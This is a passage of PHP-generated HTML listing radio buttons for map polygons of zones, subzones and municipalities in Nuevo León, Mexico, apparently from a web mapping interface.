                                                                                        <tr>
                                                                                            <td>
                                                                                                <input  type="radio" name="polidelta" id="polidelta7" onclick="printaPD(\'CUMBRES\',\'polidelta7\',12);" /> Cumbres<br>
                                                                                            </td>
                                                                                        </tr>
                                                                                        <tr>
                                                                                            <td>
                                                                                                <input  type="radio" name="polidelta" id="polidelta8" onclick="printaPD(\'DOMO\',\'polidelta8\',12);" /> Domo<br>
                                                                                            </td>
                                                                                        </tr>
                                                                                        <tr>
                                                                                            <td>
                                                                                                <input  type="radio" name="polidelta" id="polidelta9" onclick="printaPD(\'GUADALUPE\',\'polidelta9\',11);" /> Guadalupe<br>
                                                                                            </td>
                                                                                        </tr>
                                                                                        <tr>
                                                                                            <td>
                                                                                                <input  type="radio" name="polidelta" id="polidelta10" onclick="printaPD(\'MITRAS\',\'polidelta10\',12);" /> Mitras<br>
                                                                                            </td>
                                                                                        </tr>
                                                                                        <tr>
                                                                                            <td>
                                                                                                <input  type="radio" name="polidelta" id="polidelta11" onclick="printaPD(\'NORTE\',\'polidelta11\',12);" /> Norte<br>
                                                                                            </td>
                                                                                        </tr>
                                                                                        <tr>
                                                                                            <td>
                                                                                                <input  type="radio" name="polidelta" id="polidelta12" onclick="printaPD(\'SAN_NICOLAS\',\'polidelta12\',12);" /> San Nicolás<br>
                                                                                            </td>
                                                                                        </tr>
                                                                                        <tr>
                                                                                            <td>
                                                                                                <input  type="radio" name="polidelta" id="polidelta13" onclick="printaPD(\'SAN_PEDRO\',\'polidelta13\',12);" /> San Pedro<br>
                                                                                            </td>
                                                                                        </tr>
                                                                                        <tr>
                                                                                            <td>
                                                                                                <input  type="radio" name="polidelta" id="polidelta14" onclick="printaPD(\'SANTA_CATARINA\',\'polidelta14\',12);" /> Santa Catarina<br>
                                                                                            </td>
                                                                                        </tr>
                                                                                        <tr>
                                                                                            <td>
                                                                                                <input  type="radio" name="polidelta" id="polidelta15" onclick="printaPD(\'SANTA_MARIA\',\'polidelta15\',13);" /> Santa María<br>
                                                                                            </td>
                                                                                        </tr>
                                                                                        <tr>
                                                                                            <td>
                                                                                                <input  type="radio" name="polidelta" id="polidelta16" onclick="printaPD(\'SUR\',\'polidelta16\',12);" /> Sur<br>
                                                                                            </td>
                                                                                        </tr>
                                                                                        <tr>
                                                                                            <td>
                                                                                                <input  type="radio" name="polidelta" id="polidelta17" onclick="printaPD(\'TOPO_CHICO\',\'polidelta17\',12);" /> Topo Chico<br>
                                                                                            </td>
                                                                                        </tr>
                                                                                        <tr>
                                                                                            <td>
                                                                                                <input  type="radio" name="polidelta" id="polidelta18" onclick="printaPD(\'VALLE_ORIENTE\',\'polidelta18\',13);" /> Valle Oriente<br>
                                                                                            </td>
                                                                                        </tr>
                                                                                        <tr>
                                                                                            <td>
                                                                                                <input  type="radio" name="polidelta" id="polidelta19" onclick="printaPD(\'VALLE_PONIENTE\',\'polidelta19\',12);" /> Valle Poniente<br>
                                                                                            </td>
                                                                                        </tr>
                                                                                        <tr>
                                                                                            <td>
                                                                                                <input  type="radio" name="polidelta" id="polidelta20" onclick="printaPD(\'VISTA_HERMOSA\',\'polidelta20\',14);" /> Vista Hermosa<br>
                                                                                            </td>
                                                                                        </tr>
                                                                                        
                                                                                    </table>
                                                                                </div>
                                                                            </div>
                                                                        </div>';
                                                                        //SUBPOLIGONOS
                                                                        $colorkml='<font color="gray" size="2">Selecciona para mostrar los poligonos.</font>';
                                                                        echo '<h2><a href="#">Poligonos subzonas</a></h2>
                                                                            <div>
                                                                                <div align="center">
                                                                                    '.$colorkml.'
                                                                                    <br>
                                                                                    <br>
                                                                                    <div class="boxContenedor">
                                                                                        <table>
                                                                                            <tr>
                                                                                                <td>
                                                                                                    <input  type="radio" name="polidelta" id="polidelta21" onclick="printaPD(\'SUBZONA_AEROPUERTO\',\'polidelta21\',13);" /> Aeropuerto<br>
                                                                                                </td>
                                                                                            </tr>
                                                                                            <tr>
                                                                                                <td>
                                                                                                    <input  type="radio" name="polidelta" id="polidelta22" onclick="printaPD(\'SUBZONA_ANTIGUA_SAN_NICOLAS\',\'polidelta22\',13);" /> Antiguo San Nicolás<br>
                                                                                                </td>
                                                                                            </tr>
                                                                                            <tr>
                                                                                                <td>
                                                                                                    <input  type="radio" name="polidelta" id="polidelta23" onclick="printaPD(\'SUBZONA_ANAHUAC\',\'polidelta23\',13);" /> Anáhuac<br>
                                                                                                </td>
                                                                                            </tr>
                                                                                            <tr>
                                                                                                <td>
                                                                                                    <input  type="radio" name="polidelta" id="polidelta24" onclick="printaPD(\'SUBZONA_APODACA\',\'polidelta24\',12);" /> Apodaca<br>
                                                                                                </td>
                                                                                            </tr>
                                                                                            <tr>
                                                                                                <td>
                                                                                                    <input  type="radio" name="polidelta" id="polidelta25" onclick="printaPD(\'SUBZONA_BELLA_VISTA\',\'polidelta25\',13);" /> Bella Vista<br>
                                                                                                </td>
                                                                                            </tr>
                                                                                            <tr>
                                                                                                <td>
                                                                                                    <input  type="radio" name="polidelta" id="polidelta26" onclick="printaPD(\'SUBZONA_BOSQUES_CUMBRES\',\'polidelta26\',13);" /> Bosques De Cumbres<br>
                                                                                                </td>
                                                                                            </tr>
                                                                                            <tr>
                                                                                                <td>
                                                                                                    <input  type="radio" name="polidelta" id="polidelta27" onclick="printaPD(\'SUBZONA_BOSQUES_DEL_VALLE\',\'polidelta27\',14);" /> Bosques Del Valle<br>
                                                                                                </td>
                                                                                            </tr>
                                                                                            <tr>
                                                                                                <td>
                                                                                                    <input  type="radio" name="polidelta" id="polidelta28" onclick="printaPD(\'SUBZONA_BRISAS\',\'polidelta28\',13);" /> Brisas<br>
                                                                                                </td>
                                                                                            </tr>
                                                                                            <tr>
                                                                                                <td>
                                                                                                    <input  type="radio" name="polidelta" id="polidelta29" onclick="printaPD(\'SUBZONA_CALLEJONES\',\'polidelta29\',14);" /> Callejones<br>
                                                                                                </td>
                                                                                            </tr>
                                                                                            <tr>
                                                                                                <td>
                                                                                                    <input  type="radio" name="polidelta" id="polidelta30" onclick="printaPD(\'SUBZONA_CASCO_URBANO\',\'polidelta30\',14);" /> Casco Urbano<br>
                                                                                                </td>
                                                                                            </tr>
                                                                                            <tr>
                                                                                                <td>
                                                                                                    <input  type="radio" name="polidelta" id="polidelta31" onclick="printaPD(\'SUBZONA_CENTRIKA\',\'polidelta31\',13);" /> Centrika<br>
                                                                                                </td>
                                                                                            </tr>
                                                                                            <tr>
                                                                                                <td>
                                                                                                    <input  type="radio" name="polidelta" id="polidelta32" onclick="printaPD(\'SUBZONA_CENTRO\',\'polidelta32\',13);" /> Centro<br>
                                                                                                </td>
                                                                                            </tr>
                                                                                            <tr>
                                                                                                <td>
                                                                                                    <input  type="radio" name="polidelta" id="polidelta33" onclick="printaPD(\'SUBZONA_CHEPINQUE\',\'polidelta33\',13);" /> Chipinque<br>
                                                                                                </td>
                                                                                            </tr>
                                                                                            <tr>
                                                                                                <td>
                                                                                                    <input  type="radio" name="polidelta" id="polidelta34" onclick="printaPD(\'SUBZONA_COLINAS\',\'polidelta34\',14);" /> Colinas<br>
                                                                                                </td>
                                                                                            </tr>
                                                                                            <tr>
                                                                                                <td>
                                                                                                    <input  type="radio" name="polidelta" id="polidelta35" onclick="printaPD(\'SUBZONA_COLINAS_DEL_VALLE\',\'polidelta35\',14);" /> Colinas Del Valle<br>
                                                                                                </td>
                                                                                            </tr>
                                                                                            <tr>
                                                                                                <td>
                                                                                                    <input  type="radio" name="polidelta" id="polidelta36" onclick="printaPD(\'SUBZONA_CONTRY\',\'polidelta36\',14);" /> Contry<br>
                                                                                                </td>
                                                                                            </tr>
                                                                                            <tr>
                                                                                                <td>
                                                                                                    <input  type="radio" name="polidelta" id="polidelta37" onclick="printaPD(\'SUBZONA_CONTRY_LA_SILLA\',\'polidelta37\',14);" /> Contry La Silla<br>
                                                                                                </td>
                                                                                            </tr>
                                                                                            <tr>
                                                                                                <td>
                                                                                                    <input  type="radio" name="polidelta" id="polidelta38" onclick="printaPD(\'SUBZONA_CUMBRES\',\'polidelta38\',13);" /> Cumbres<br>
                                                                                                </td>
                                                                                            </tr>
                                                                                            <tr>
                                                                                                <td>
                                                                                                    <input  type="radio" name="polidelta" id="polidelta39" onclick="printaPD(\'SUBZONA_DEL_VALLE\',\'polidelta39\',13);" /> Del Valle<br>
                                                                                                </td>
                                                                                            </tr>
                                                                                            <tr>
                                                                                                <td>
                                                                                                    <input  type="radio" name="polidelta" id="polidelta40" onclick="printaPD(\'SUBZONA_DINASTIA\',\'polidelta40\',15);" /> Dinastía<br>
                                                                                                </td>
                                                                                            </tr>
                                                                                            <tr>
                                                                                                <td>
                                                                                                    <input  type="radio" name="polidelta" id="polidelta41" onclick="printaPD(\'SUBZONA_DOMO\',\'polidelta41\',13);" /> Domo<br>
                                                                                                </td>
                                                                                            </tr>
                                                                                            <tr>
                                                                                                <td>
                                                                                                    <input  type="radio" name="polidelta" id="polidelta42" onclick="printaPD(\'SUBZONA_EL_ROSARIO\',\'polidelta42\',14);" /> El Rosario<br>
                                                                                                </td>
                                                                                            </tr>
                                                                                            <tr>
                                                                                                <td>
                                                                                                    <input  type="radio" name="polidelta" id="polidelta43" onclick="printaPD(\'SUBZONA_EL_ESCOBEDO\',\'polidelta43\',13);" /> Escobedo<br>
                                                                                                </td>
                                                                                            </tr>
                                                                                            <tr>
                                                                                                <td>
                                                                                                    <input  type="radio" name="polidelta" id="polidelta44" onclick="printaPD(\'SUBZONA_FAMA\',\'polidelta44\',12);" /> Fama<br>
                                                                                                </td>
                                                                                            </tr>
                                                                                            <tr>
                                                                                                <td>
                                                                                                    <input  type="radio" name="polidelta" id="polidelta45" onclick="printaPD(\'SUBZONA_FOCOS\',\'polidelta45\',13);" /> Focos<br>
                                                                                                </td>
                                                                                            </tr>
                                                                                            <tr>
                                                                                                <td>
                                                                                                    <input  type="radio" name="polidelta" id="polidelta46" onclick="printaPD(\'SUBZONA_GPE_JUAREZ\',\'polidelta46\',12);" /> Gpe/Juárez<br>
                                                                                                </td>
                                                                                            </tr>
                                                                                            <tr>
                                                                                                <td>
                                                                                                    <input  type="radio" name="polidelta" id="polidelta47" onclick="printaPD(\'SUBZONA_HUINALA\',\'polidelta47\',12);" />Huinalá<br>
                                                                                                </td>
                                                                                            </tr>
                                                                                            <tr>
                                                                                                <td>
                                                                                                    <input  type="radio" name="polidelta" id="polidelta48" onclick="printaPD(\'SUBZONA_INDEPENDENCIA\',\'polidelta48\',13);" />Independencia<br>
                                                                                                </td>
                                                                                            </tr>
                                                                                            <tr>
                                                                                                <td>
                                                                                                    <input  type="radio" name="polidelta" id="polidelta49" onclick="printaPD(\'SUBZONA_INDUSTRIAL\',\'polidelta49\',12);" />Industrial<br>
                                                                                                </td>
                                                                                            </tr>
                                                                                            <tr>
                                                                                                <td>
                                                                                                    <input  type="radio" name="polidelta" id="polidelta50" onclick="printaPD(\'SUBZONA_LA_FE\',\'polidelta50\',12);" />La Fe<br>
                                                                                                </td>
                                                                                            </tr>
                                                                                            <tr>
                                                                                                <td>
                                                                                                    <input  type="radio" name="polidelta" id="polidelta51" onclick="printaPD(\'SUBZONA_LADRILLERA\',\'polidelta51\',14);" />Ladrillera<br>
                                                                                                </td>
                                                                                            </tr>
                                                                                            <tr>
                                                                                                <td>
                                                                                                    <input  type="radio" name="polidelta" id="polidelta52" onclick="printaPD(\'SUBZONA_LAS_TORRES\',\'polidelta52\',13);" />Las Torres<br>
                                                                                                </td>
                                                                                            </tr>
                                                                                            <tr>
                                                                                                <td>
                                                                                                    <input  type="radio" name="polidelta" id="polidelta53" onclick="printaPD(\'SUBZONA_LINDAVISTA\',\'polidelta53\',13);" />Lindavista<br>
                                                                                                </td>
                                                                                            </tr>
                                                                                            <tr>
                                                                                                <td>
                                                                                                    <input  type="radio" name="polidelta" id="polidelta54" onclick="printaPD(\'SUBZONA_LOMA_LARGA_MTY\',\'polidelta54\',13);" />Loma Larga Mty<br>
                                                                                                </td>
                                                                                            </tr>
                                                                                            <tr>
                                                                                                <td>
                                                                                                    <input  type="radio" name="polidelta" id="polidelta55" onclick="printaPD(\'SUBZONA_LOMA_SAN_PEDRO\',\'polidelta55\',13);" />Loma Larga San Pedro<br>
                                                                                                </td>
                                                                                            </tr>
                                                                                            <tr>
                                                                                                <td>
                                                                                                    <input  type="radio" name="polidelta" id="polidelta56" onclick="printaPD(\'SUBZONA_MARGAIN\',\'polidelta56\',14);" />Margaín<br>
                                                                                                </td>
                                                                                            </tr>
                                                                                            <tr>
                                                                                                <td>
                                                                                                    <input  type="radio" name="polidelta" id="polidelta57" onclick="printaPD(\'SUBZONA_MITRAS\',\'polidelta57\',13);" />Mitras<br>
                                                                                                </td>
                                                                                            </tr>
                                                                                            <tr>
                                                                                                <td>
                                                                                                    <input  type="radio" name="polidelta" id="polidelta58" onclick="printaPD(\'SUBZONA_NORTE\',\'polidelta58\',12);" />Norte<br>
                                                                                                </td>
                                                                                            </tr>
                                                                                            <tr>
                                                                                                <td>
                                                                                                    <input  type="radio" name="polidelta" id="polidelta59" onclick="printaPD(\'SUBZONA_OBISPADO\',\'polidelta59\',14);" />Obispado<br>
                                                                                                </td>
                                                                                            </tr>
                                                                                            <tr>
                                                                                                <td>
                                                                                                    <input  type="radio" name="polidelta" id="polidelta60" onclick="printaPD(\'SUBZONA_PALO_BLANCO\',\'polidelta60\',14);" />Palo Blanco<br>
                                                                                                </td>
                                                                                            </tr>
                                                                                            <tr>
                                                                                                <td>
                                                                                                    <input  type="radio" name="polidelta" id="polidelta61" onclick="printaPD(\'SUBZONA_PRIVADOS_ANAHUAC\',\'polidelta61\',13);" />Privadas De Anáhuac<br>
                                                                                                </td>
                                                                                            </tr>
                                                                                            <tr>
                                                                                                <td>
                                                                                                    <input  type="radio" name="polidelta" id="polidelta62" onclick="printaPD(\'SUBZONA_PUERTA_DE_HIERRO\',\'polidelta62\',13);" />Puerta De Hierro<br>
                                                                                                </td>
                                                                                            </tr>
                                                                                            <tr>
                                                                                                <td>
                                                                                                    <input  type="radio" name="polidelta" id="polidelta63" onclick="printaPD(\'SUBZONA_ROMO\',\'polidelta63\',14);" />Roma<br>
                                                                                                </td>
                                                                                            </tr>
                                                                                            <tr>
                                                                                                <td>
                                                                                                    <input  type="radio" name="polidelta" id="polidelta64" onclick="printaPD(\'SUBZONA_SAN_AGUSTIN\',\'polidelta64\',13);" />San Agustín<br>
                                                                                                </td>
                                                                                            </tr>
                                                                                            <tr>
                                                                                                <td>
                                                                                                    <input  type="radio" name="polidelta" id="polidelta65" onclick="printaPD(\'SUBZONA_SAN_JERONIMO\',\'polidelta65\',14);" />San Jerónimo<br>
                                                                                                </td>
                                                                                            </tr>
                                                                                            <tr>
                                                                                                <td>
                                                                                                    <input  type="radio" name="polidelta" id="polidelta66" onclick="printaPD(\'SUBZONA_SANTA_MARIA\',\'polidelta66\',14);" />Santa María<br>
                                                                                                </td>
                                                                                            </tr>
                                                                                            <tr>
                                                                                                <td>
                                                                                                    <input  type="radio" name="polidelta" id="polidelta67" onclick="printaPD(\'SUBZONA_SANTIAGO\',\'polidelta67\',11);" />Santiago<br>
                                                                                                </td>
                                                                                            </tr>
                                                                                            <tr>
                                                                                                <td>
                                                                                                    <input  type="radio" name="polidelta" id="polidelta68" onclick="printaPD(\'SUBZONA_TAMPIQUITO\',\'polidelta68\',15);" />Tampiquito<br>
                                                                                                </td>
                                                                                            </tr>
                                                                                            <tr>
                                                                                                <td>
                                                                                                    <input  type="radio" name="polidelta" id="polidelta69" onclick="printaPD(\'SUBZONA_TECNOLOGICO\',\'polidelta69\',14);" />Tecnológico<br>
                                                                                                </td>
                                                                                            </tr>
                                                                                            <tr>
                                                                                                <td>
                                                                                                    <input  type="radio" name="polidelta" id="polidelta70" onclick="printaPD(\'SUBZONA_TOPO_CHICO\',\'polidelta70\',12);" />Topo Chico<br>
                                                                                                </td>
                                                                                            </tr>
                                                                                            <tr>
                                                                                                <td>
                                                                                                    <input  type="radio" name="polidelta" id="polidelta71" onclick="printaPD(\'SUBZONA_VALLE_ALTO\',\'polidelta71\',12);" />Valle Alto<br>
                                                                                                </td>
                                                                                            </tr>
                                                                                            <tr>
                                                                                                <td>
                                                                                                    <input  type="radio" name="polidelta" id="polidelta72" onclick="printaPD(\'SUBZONA_VALLE_ORIENTE\',\'polidelta72\',14);" />Valle Oriente<br>
                                                                                                </td>
                                                                                            </tr>
                                                                                            <tr>
                                                                                                <td>
                                                                                                    <input  type="radio" name="polidelta" id="polidelta73" onclick="printaPD(\'SUBZONA_VALLE_PONIENTE\',\'polidelta73\',13);" />Valle Poniente<br>
                                                                                                </td>
                                                                                            </tr>
                                                                                            <tr>
                                                                                                <td>
                                                                                                    <input  type="radio" name="polidelta" id="polidelta74" onclick="printaPD(\'SUBZONA_VALLE_SOLEADO\',\'polidelta74\',12);" />Valle Soleado<br>
                                                                                                </td>
                                                                                            </tr>
                                                                                            <tr>
                                                                                                <td>
                                                                                                    <input  type="radio" name="polidelta" id="polidelta75" onclick="printaPD(\'SUBZONA_VALLE_VERDE\',\'polidelta75\',12);" />Valle Verde<br>
                                                                                                </td>
                                                                                            </tr>
                                                                                            <tr>
                                                                                                <td>
                                                                                                    <input  type="radio" name="polidelta" id="polidelta76" onclick="printaPD(\'SUBZONA_VILLA_HERMOSA\',\'polidelta76\',14);" />Vista Hermosa<br>
                                                                                                </td>
                                                                                            </tr>
                                                                                        </table>
                                                                                    </div>
                                                                                </div>
                                                                            </div>';
                                                                    $colorkml='<font color="gray" size="2">Selecciona para mostrar los poligonos.</font>';
                                                                    echo '<h2><a href="#">Poligonos por municipio</a></h2>
                                                                    <div>
                                                                        <div align="center">
                                                                            '.$colorkml.'
                                                                            <br>
                                                                            <br>
                                                                            <div class="boxContenedor">
                                                                                <table>
                                                                                    <tr>
                                                                                        <td>
                                                                                            <input  type="radio" name="polidelta" id="polideltaC1" onclick="printaPD(\'MUNICIPIO_ABASOLO\',\'polideltaC1\',12);" />Abasolo<br>
                                                                                        </td>
                                                                                    </tr>
                                                                                    <tr>
                                                                                        <td>
                                                                                            <input  type="radio" name="polidelta" id="polideltaC2" onclick="printaPD(\'MUNICIPIO_AGUALEGUAS\',\'polideltaC2\',10);" />Agualeguas<br>
                                                                                        </td>
                                                                                    </tr>
                                                                                    <tr>
                                                                                        <td>
                                                                                            <input  type="radio" name="polidelta" id="polideltaC3" onclick="printaPD(\'MUNICIPIO_LOS_ALDAMAS\',\'polideltaC3\',10);" />Los Aldamas<br>
                                                                                        </td>
                                                                                    </tr>
                                                                                    <tr>
                                                                                        <td>
                                                                                            <input  type="radio" name="polidelta" id="polideltaC4" onclick="printaPD(\'MUNICIPIO_ALLENDE\',\'polideltaC4\',12);" />Allende<br>
                                                                                        </td>
                                                                                    </tr>
                                                                                    <tr>
                                                                                        <td>
                                                                                            <input  type="radio" name="polidelta" id="polideltaC5" onclick="printaPD(\'MUNICIPIO_ANAHUAC\',\'polideltaC5\',10);" />Anáhuac<br>
                                                                                        </td>
                                                                                    </tr>
                                                                                    <tr>
                                                                                        <td>
                                                                                            <input  type="radio" name="polidelta" id="polideltaC6" onclick="printaPD(\'MUNICIPIO_APODACA\',\'polideltaC6\',12);" />Apodaca<br>
                                                                                        </td>
                                                                                    </tr>
                                                                                    <tr>
                                                                                        <td>
                                                                                            <input  type="radio" name="polidelta" id="polideltaC7" onclick="printaPD(\'MUNICIPIO_ARAMBERRI\',\'polideltaC7\',10);" /> Aramberri<br>
                                                                                        </td>
                                                                                    </tr>
                                                                                    <tr>
                                                                                        <td>
                                                                                            <input  type="radio" name="polidelta" id="polideltaC8" onclick="printaPD(\'MUNICIPIO_BUSTAMANTE\',\'polideltaC8\',10);" />Bustamante<br>
                                                                                        </td>
                                                                                    </tr>
                                                                                    <tr>
                                                                                        <td>
                                                                                            <input  type="radio" name="polidelta" id="polideltaC9" onclick="printaPD(\'MUNICIPIO_CADEREY_JIMENEZ\',\'polideltaC9\',10);" />Cadereyta Jiménez<br>
                                                                                        </td>
                                                                                    </tr>
                                                                                    <tr>
                                                                                        <td>
                                                                                            <input  type="radio" name="polidelta" id="polideltaC10" onclick="printaPD(\'MUNICIPIO_EL_CARMEN\',\'polideltaC10\',10);" />El Carmen<br>
                                                                                        </td>
                                                                                    </tr>
                                                                                    <tr>
                                                                                        <td>
                                                                                            <input  type="radio" name="polidelta" id="polideltaC11" onclick="printaPD(\'MUNICIPIO_CERRALVO\',\'polideltaC11\',10);" />Cerralvo<br>
                                                                                        </td>
                                                                                    </tr>
                                                                                    <tr>
                                                                                        <td>
                                                                                            <input  type="radio" name="polidelta" id="polideltaC12" onclick="printaPD(\'MUNICIPIO_CIENEGA_FLORES\',\'polideltaC12\',10);" />Ciénega de Flores<br>
                                                                                        </td>
                                                                                    </tr>
                                                                                    <tr>
                                                                                        <td>
                                                                                            <input  type="radio" name="polidelta" id="polideltaC13" onclick="printaPD(\'MUNICIPIO_CHINA\',\'polideltaC13\',10);" />China<br>
                                                                                        </td>
                                                                                    </tr>
                                                                                    <tr>
                                                                                        <td>
                                                                                            <input  type="radio" name="polidelta" id="polideltaC14" onclick="printaPD(\'MUNICIPIO_DOCTOR_ARROYO\',\'polideltaC14\',10);" />Doctor Arroyo<br>
                                                                                        </td>
                                                                                    </tr>
                                                                                    <tr>
                                                                                        <td>
                                                                                            <input  type="radio" name="polidelta" id="polideltaC15" onclick="printaPD(\'MUNICIPIO_DOCTOR_COSS\',\'polideltaC15\',10);" />Doctor Cossc<br>
                                                                                        </td>
                                                                                    </tr>
                                                                                    <tr>
                                                                                        <td>
                                                                                            <input  type="radio" name="polidelta" id="polideltaC16" onclick="printaPD(\'MUNICIPIO_DOCTOR_GONZALEZ\',\'polideltaC16\',10);" />Doctor González<br>
                                                                                        </td>
                                                                                    </tr>
                                                                                    <tr>
                                                                                        <td>
                                                                                            <input  type="radio" name="polidelta" id="polideltaC17" onclick="printaPD(\'MUNICIPIO_GALEANA\',\'polideltaC17\',10);" />Galeana<br>
                                                                                        </td>
                                                                                    </tr>
                                                                                    <tr>
                                                                                        <td>
                                                                                            <input  type="radio" name="polidelta" id="polideltaC18" onclick="printaPD(\'MUNICIPIO_GARCIA\',\'polideltaC18\',10);" />García<br>
                                                                                        </td>
                                                                                    </tr>
                                                                                    <tr>
                                                                                        <td>
                                                                                            <input  type="radio" name="polidelta" id="polideltaC19" onclick="printaPD(\'MUNICIPIO_SAN_PEDRO_GARZA_GARCIA\',\'polideltaC19\',12);" />San Pedro Garza García<br>
                                                                                        </td>
                                                                                    </tr>
                                                                                    <tr>
                                                                                        <td>
                                                                                            <input  type="radio" name="polidelta" id="polideltaC20" onclick="printaPD(\'MUNICIPIO_GENERAL_BRAVO\',\'polideltaC20\',10);" />General Bravo<br>
                                                                                        </td>
                                                                                    </tr>
                                                                                    <tr>
                                                                                        <td>
                                                                                            <input  type="radio" name="polidelta" id="polideltaC21" onclick="printaPD(\'MUNICIPIO_GENERAL_ESCOBEDO\',\'polideltaC21\',10);" />General Escobedo<br>
                                                                                        </td>
                                                                                    </tr>
                                                                                    <tr>
                                                                                        <td>
                                                                                            <input  type="radio" name="polidelta" id="polideltaC22" onclick="printaPD(\'MUNICIPIO_GENERAL_TERRAN\',\'polideltaC22\',10);" />General Terán<br>
                                                                                        </td>
                                                                                    </tr>
                                                                                    <tr>
                                                                                        <td>
                                                                                            <input  type="radio" name="polidelta" id="polideltaC23" onclick="printaPD(\'MUNICIPIO_GENERAL_TREVINO\',\'polideltaC23\',10);" />General Treviño<br>
                                                                                        </td>
                                                                                    </tr>
                                                                                    <tr>
                                                                                        <td>
                                                                                            <input  type="radio" name="polidelta" id="polideltaC24" onclick="printaPD(\'MUNICIPIO_GENERAL_ZARAGOZA\',\'polideltaC24\',10);" />General Zaragoza<br>
                                                                                        </td>
                                                                                    </tr>
                                                                                    <tr>
                                                                                        <td>
                                                                                            <input  type="radio" name="polidelta" id="polideltaC25" onclick="printaPD(\'MUNICIPIO_GENERAL_ZUAZUA\',\'polideltaC25\',10);" />General Zuazua<br>
                                                                                        </td>
                                                                                    </tr>
                                                                                    <tr>
                                                                                        <td>
                                                                                            <input  type="radio" name="polidelta" id="polideltaC26" onclick="printaPD(\'MUNICIPIO_GUADALUPE\',\'polideltaC26\',12);" />Guadalupe<br>
                                                                                        </td>
                                                                                    </tr>
                                                                                    <tr>
                                                                                        <td>
                                                                                            <input  type="radio" name="polidelta" id="polideltaC27" onclick="printaPD(\'MUNICIPIO_LOS_HERRERAS\',\'polideltaC27\',10);" />Los Herreras<br>
                                                                                        </td>
                                                                                    </tr>
                                                                                    <tr>
                                                                                        <td>
                                                                                            <input  type="radio" name="polidelta" id="polideltaC28" onclick="printaPD(\'MUNICIPIO_HIGUERAS\',\'polideltaC28\',10);" />Higueras<br>
                                                                                        </td>
                                                                                    </tr>
                                                                                    <tr>
                                                                                        <td>
                                                                                            <input  type="radio" name="polidelta" id="polideltaC29" onclick="printaPD(\'MUNICIPIO_HUALAHUISES\',\'polideltaC29\',12);" />Hualahuises<br>
                                                                                        </td>
                                                                                    </tr>
                                                                                    <tr>
                                                                                        <td>
                                                                                            <input  type="radio" name="polidelta" id="polideltaC30" onclick="printaPD(\'MUNICIPIO_ITURBIDE\',\'polideltaC30\',10);" />Iturbide<br>
                                                                                        </td>
                                                                                    </tr>
                                                                                    <tr>
                                                                                        <td>
                                                                                            <input  type="radio" name="polidelta" id="polideltaC31" onclick="printaPD(\'MUNICIPIO_JUAREZ\',\'polideltaC31\',10);" />Juárez<br>
                                                                                        </td>
                                                                                    </tr>
                                                                                    <tr>
                                                                                        <td>
                                                                                            <input  type="radio" name="polidelta" id="polideltaC32" onclick="printaPD(\'MUNICIPIO_LAMPAZOS_DE_NARANJO\',\'polideltaC32\',10);" />Lampazos de Naranjo<br>
                                                                                        </td>
                                                                                    </tr>
                                                                                    <tr>
                                                                                        <td>
                                                                                            <input  type="radio" name="polidelta" id="polideltaC33" onclick="printaPD(\'MUNICIPIO_LINARES\',\'polideltaC33\',10);" />Linares<br>
                                                                                        </td>
                                                                                    </tr>
                                                                                    <tr>
                                                                                        <td>
                                                                                            <input  type="radio" name="polidelta" id="polideltaC34" onclick="printaPD(\'MUNICIPIO_MARIN\',\'polideltaC34\',10);" />Marín<br>
                                                                                        </td>
                                                                                    </tr>
                                                                                    <tr>
                                                                                        <td>
                                                                                            <input  type="radio" name="polidelta" id="polideltaC35" onclick="printaPD(\'MUNICIPIO_MELCHOR_OCAMPO\',\'polideltaC35\',12);" />Melchor Ocampo<br>
                                                                                        </td>
                                                                                    </tr>
                                                                                    <tr>
                                                                                        <td>
                                                                                            <input  type="radio" name="polidelta" id="polideltaC36" onclick="printaPD(\'MUNICIPIO_MIER_Y_NORIEGA\',\'polideltaC36\',10);" />Mier y Noriega<br>
                                                                                        </td>
                                                                                    </tr>
                                                                                    <tr>
                                                                                        <td>
                                                                                            <input  type="radio" name="polidelta" id="polideltaC37" onclick="printaPD(\'MUNICIPIO_MINA\',\'polideltaC37\',10);" />Mina<br>
                                                                                        </td>
                                                                                    </tr>
                                                                                    <tr>
                                                                                        <td>
                                                                                            <input  type="radio" name="polidelta" id="polideltaC38" onclick="printaPD(\'MUNICIPIO_MONTEMORELOS\',\'polideltaC38\',10);" />Montemorelos<br>
                                                                                        </td>
                                                                                    </tr>
                                                                                    <tr>
                                                                                        <td>
                                                                                            <input  type="radio" name="polidelta" id="polideltaC39" onclick="printaPD(\'MUNICIPIO_MONTERREY\',\'polideltaC39\',10);" />Monterrey<br>
                                                                                        </td>
                                                                                    </tr>
                                                                                    <tr>
                                                                                        <td>
                                                                                            <input  type="radio" name="polidelta" id="polideltaC40" onclick="printaPD(\'MUNICIPIO_PARAS\',\'polideltaC40\',10);" />Parás<br>
                                                                                        </td>
                                                                                    </tr>
                                                                                    <tr>
                                                                                        <td>
                                                                                            <input  type="radio" name="polidelta" id="polideltaC41" onclick="printaPD(\'MUNICIPIO_PESQUERIA\',\'polideltaC41\',10);" />Pesquería<br>
                                                                                        </td>
                                                                                    </tr>
                                                                                    <tr>
                                                                                        <td>
                                                                                            <input  type="radio" name="polidelta" id="polideltaC42" onclick="printaPD(\'MUNICIPIO_LOS_RAMONES\',\'polideltaC42\',10);" />Los Ramones<br>
                                                                                        </td>
                                                                                    </tr>
                                                                                    <tr>
                                                                                        <td>
                                                                                            <input  type="radio" name="polidelta" id="polideltaC43" onclick="printaPD(\'MUNICIPIO_RAYONES\',\'polideltaC43\',10);" />Rayones<br>
                                                                                        </td>
                                                                                    </tr>
                                                                                    <tr>
                                                                                        <td>
                                                                                            <input  type="radio" name="polidelta" id="polideltaC44" onclick="printaPD(\'MUNICIPIO_SABINAS_HIDALGO\',\'polideltaC44\',10);" />Sabinas Hidalgo<br>
                                                                                        </td>
                                                                                    </tr>
                                                                                    <tr>
                                                                                        <td>
                                                                                            <input  type="radio" name="polidelta" id="polideltaC45" onclick="printaPD(\'MUNICIPIO_SALINAS_VICTORIA\',\'polideltaC45\',10);" />Salinas Victoria<br>
                                                                                        </td>
                                                                                    </tr>
                                                                                    <tr>
                                                                                        <td>
                                                                                            <input  type="radio" name="polidelta" id="polideltaC46" onclick="printaPD(\'MUNICIPIO_SAN_NICOLAS_GARZA\',\'polideltaC46\',12);" />San Nicolás de los Garza<br>
                                                                                        </td>
                                                                                    </tr>
                                                                                    <tr>
                                                                                        <td>
                                                                                            <input  type="radio" name="polidelta" id="polideltaC47" onclick="printaPD(\'MUNICIPIO_HIDALGO\',\'polideltaC47\',10);" />Hidalgo<br>
                                                                                        </td>
                                                                                    </tr>
                                                                                    <tr>
                                                                                        <td>
